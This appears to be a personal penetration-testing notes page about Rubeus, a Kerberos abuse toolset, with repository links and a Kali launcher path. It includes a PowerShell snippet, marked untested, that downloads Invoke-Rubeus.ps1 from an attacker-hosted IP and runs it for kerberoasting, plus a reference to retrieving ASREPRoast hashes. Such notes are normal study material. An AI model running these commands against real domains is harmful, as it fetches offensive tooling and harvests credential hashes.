public:: true

- ```
     ______        _
    (_____ \      | |
     _____) )_   _| |__  _____ _   _  ___
    |  __  /| | | |  _ \| ___ | | | |/___)
    | |  \ \| |_| | |_) ) ____| |_| |___ |
    |_|   |_|____/|____/|_____)____/(___/
  
    v2.3.0
  ```
  Rubeus is a C# toolset for raw Kerberos interaction and abuses.
- Official [repository](https://github.com/GhostPack/Rubeus)
- Can be [executed from PowerShell](https://github.com/GhostPack/Rubeus#sidenote-running-rubeus-through-powershell).
	- Kali provides a `.ps1` launcher which embeds a pre-compiled Rubeus PE.
	  `/usr/share/powershell-empire/empire/server/data/module_source/credentials/Invoke-Rubeus.ps1`
	  Or it can be downloaded from [here](https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Rubeus.ps1).
	- Something like the following commands might do the trick. TODO: try this out.
	  ```powershell
	  powershell -c "Invoke-WebRequest 'http://192.168.45.183:8000/Invoke-Rubeus.ps1' -OutFile 'Invoke-Rubeus.ps1'"
	  .\Invoke-Rubeus.ps1 -Command “kerberoast /stats”
	  ```
- Retrieve [[ASREPRoast]] hashes
  id:: 655cede6-f368-47a0-ba38-5d1cb32ab48f
  {{embed ((655cf178-e37d-4ab0-9e2b-e16c2ff7c94f))}}